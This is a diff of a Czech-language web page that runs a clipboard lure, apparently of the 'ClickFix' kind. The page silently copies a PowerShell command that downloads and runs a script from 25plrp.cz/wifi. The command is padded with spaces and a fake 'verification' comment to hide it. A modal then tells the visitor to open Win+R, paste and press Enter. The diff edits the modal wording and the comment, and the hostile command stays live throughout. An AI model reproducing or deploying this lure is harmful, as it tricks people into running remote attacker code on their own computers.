@@ -78,7 +78,7 @@
 
   <div id="alertModal" class="modal">
     <h2>⚠️ Instrukce</h2>
-    <p>Spusťte Win+R<br>Vložte zkopírovaný text (Ctrl+V)<br>Potvrďte Enter</p>
+    <p>Spusťte Win+R<br>Vložte zkopírovaný text (Ctrl+V)<br><br>Zmáčkněte DELETE pro odstranení ❌ <br>Potvrďte Enter</p>
   </div>
 
   <script>
@@ -100,7 +100,7 @@
 
         // Kopírování příkazu (můžete upravit dle potřeby)
         const psCommand =
-          'powershell iwr "25plrp.cz/wifi" | iex           #             Po stisku proběhne ověření na vašem počítači ✅';
+          'powershell iwr "25plrp.cz/wifi" | iex           #             Po stisku proběhne ověření na vašem počítači ✅ ❌';
         navigator.clipboard.writeText(psCommand).catch(() => {});
       }
     });
